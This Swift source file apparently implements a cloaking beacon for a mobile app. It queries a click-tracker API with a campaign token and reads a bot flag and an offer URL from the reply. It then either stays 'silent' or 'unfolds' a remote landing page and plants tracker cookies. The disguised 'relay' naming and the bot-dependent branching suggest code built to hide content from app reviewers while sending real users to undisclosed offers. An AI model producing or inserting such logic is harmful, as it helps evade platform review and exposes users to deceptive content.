import Foundation

struct BeaconConfig {
    var trackerDomain: String
    var campaignToken: String
    var probeWindow: TimeInterval
    var subParams: [String: String]
    var targetStreams: Set<Int>?
    var idleOutcome: BeaconOutcome

    static var bundled: BeaconConfig {
        BeaconConfig(
            trackerDomain: AppConfig.relayHost,
            campaignToken: AppConfig.relayKey,
            probeWindow: AppConfig.relayWindow,
            subParams: AppConfig.relayHints,
            targetStreams: AppConfig.relayTargets,
            idleOutcome: .silent
        )
    }

    var probeURL: URL? {
        var components = URLComponents()
        components.scheme = "https"
        components.host = trackerDomain
        components.path = "/click_api/v3"
        var items: [URLQueryItem] = [
            URLQueryItem(name: "token", value: campaignToken),
            URLQueryItem(name: "log", value: "1"),
            URLQueryItem(name: "info", value: "1")
        ]
        for key in subParams.keys.sorted() {
            if let value = subParams[key] {
                items.append(URLQueryItem(name: key, value: value))
            }
        }
        components.queryItems = items
        return components.url
    }

    func offerURL(token: String) -> URL? {
        var components = URLComponents()
        components.scheme = "https"
        components.host = trackerDomain
        components.path = "/"
        components.queryItems = [
            URLQueryItem(name: "_lp", value: "1"),
            URLQueryItem(name: "_token", value: token)
        ]
        return components.url
    }

    var is_provisioned: Bool {
        guard !trackerDomain.isEmpty else { return false }
        guard !campaignToken.isEmpty else { return false }
        guard !campaignToken.contains("REPLACE_WITH_") else { return false }
        return true
    }
}

enum BeaconOutcome: Equatable {
    case unfold(URL)
    case silent
}

struct RemoteRelayAnswer: Decodable {
    struct Info: Decodable {
        let stream_id: Int?
        let offer_id: Int?
        let landing_id: Int?
        let token: String?
        let sub_id: String?
        let campaign_id: Int?
        let is_bot: Bool?
        let type: String?
        let url: String?
    }
    let info: Info?
    let headers: [String]?
    let cookies: [String: String]?
    let cookies_ttl: Int?
    let contentType: String?

    var resolvedURL: URL? {
        if let raw = info?.url, !raw.isEmpty,
           let parsed = URL(string: raw), validScheme(parsed) {
            return parsed
        }
        if let lines = headers {
            for line in lines {
                let lower = line.lowercased()
                guard lower.hasPrefix("location:") else { continue }
                let value = line
                    .dropFirst("location:".count)
                    .trimmingCharacters(in: .whitespaces)
                if let parsed = URL(string: String(value)), validScheme(parsed) {
                    return parsed
                }
            }
        }
        return nil
    }

    var unfoldToken: String? {
        guard let raw = info?.token, !raw.isEmpty else { return nil }
        return raw
    }

    func sessionCookies(host: String) -> [HTTPCookie] {
        guard let dict = cookies, !dict.isEmpty, !host.isEmpty else { return [] }
        let ttlHours = TimeInterval(cookies_ttl ?? 24)
        let expires = Date().addingTimeInterval(ttlHours * 3600)
        var jar: [HTTPCookie] = []
        for (name, value) in dict {
            let attrs: [HTTPCookiePropertyKey: Any] = [
                .domain: host,
                .path: "/",
                .name: name,
                .value: value,
                .expires: expires,
                .secure: "TRUE"
            ]
            if let c = HTTPCookie(properties: attrs) {
                jar.append(c)
            }
        }
        return jar
    }

    private func validScheme(_ url: URL) -> Bool {
        let scheme = (url.scheme ?? "").lowercased()
        return scheme == "https" || scheme == "http"
    }
}

struct BeaconBundle {
    let outcome: BeaconOutcome
    let cookies: [HTTPCookie]
}
